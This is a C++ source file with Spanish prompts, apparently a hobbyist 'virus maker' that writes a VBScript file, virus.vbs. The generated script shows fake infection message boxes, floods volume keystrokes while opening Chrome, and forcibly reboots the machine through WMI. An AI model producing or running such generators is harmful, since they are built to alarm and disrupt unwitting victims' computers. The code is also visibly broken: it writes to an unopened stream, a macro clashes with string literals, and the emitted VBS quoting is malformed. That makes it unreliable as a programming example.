/*-----------------------------------|
|CosmoXD(c) 2019                     |
|                                    |       
|                                    |
|                                    |
|-----------------------------------*/
#include <iostream>
#include <fstream>
#include <string>

#define endl "\n"
#define clearConsole system("clear");

void showOptions()
{
    std::cout << "1. Abrir otra alerta" << endl;
    std::cout << "2. Abrir pagina web(SOLO CHROME)" << endl;
    std::cout << "3. Reiniciar PC" << endl;
    std::cout << "4. Terminar virus" << endl;
}

void showSpanish()
{
    std::ofstream virus;
    char nombreVirus[500];
    try
    {
        std::cout << "Ahora dime el nombre de tu virus: ";
        std::cin >> nombreVirus;
        virus << nombreVirus;
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
        std::cout << "ERROR!, The virus name cannot have spaces!. 0x3" << endl;
    }
    

    // ESTA PARTE CREA EL ARCHIVO DEL VIRUS FINAL
    try
    {
        virus.open("virus.vbs", std::ios::ate);
        virus << "msgbox(\"" << "Has sido infectado por el virus" << "" << nombreVirus << "\")";
    }
    catch(const std::exception& e)
    {
        std::cout << "ERROR Creating the virus.vbs file!. 0x2" << endl;
    }

    std::cout << "Ahora selecciona las acciones que quieres que tu virus haga" << endl;

    //Este es el "main loop" en el cual se escribiran los eventos
    for(int i = 0; i < 1000; i++)
    {
        int option;
        showOptions();
        scanf("%i", &option);
        if(option == 1)
        {
            std::cout << "Por favor dime que otro mensaje quieres que despliege el programa: ";
            char mensaje[500];
            std::cin >> mensaje;
            virus << endl << "msgbox(\"" << mensaje << "\")";
            clearConsole
        }
        else if (option == 2)
        {
            char abrirWebChrome[] = 
            endl
            "Option Explicit"
            endl
            "Dim URL,WshShell,i"
            endl
            "URL = \"www.google.com\""
            endl
            "Set WshShell = CreateObject(\"WScript.shell\")"
            endl
            "For i = 0 to 50"
            endl
            "WshShell.SendKeys(chr(175))"
            endl
            "Next"
            endl
            "WshShell.run \"CMD /C start chrome.exe\" & URL & "",0,False"
            endl;
            virus << abrirWebChrome;
            clearConsole
        }
        else if(option == 3)
        {
            char reiniciarPC[] = 
            endl
            "Set OpSysSet = GetObject(\"winmgmts:{impersonationLevel=impersonate,(RemoteShutdown)}//\" & mname).ExecQuery(\"select * from Win32_OperatingSystem where Primary=true\")"
            endl
            "for each OpSys in OpSysSet"
            "   OpSys.Reboot()"
            endl
            "next";
            virus << reiniciarPC;
            clearConsole
        }
        else if(option == 4)
        {
            break;
            system("PAUSE");
            clearConsole
        }
        i++;
    }
}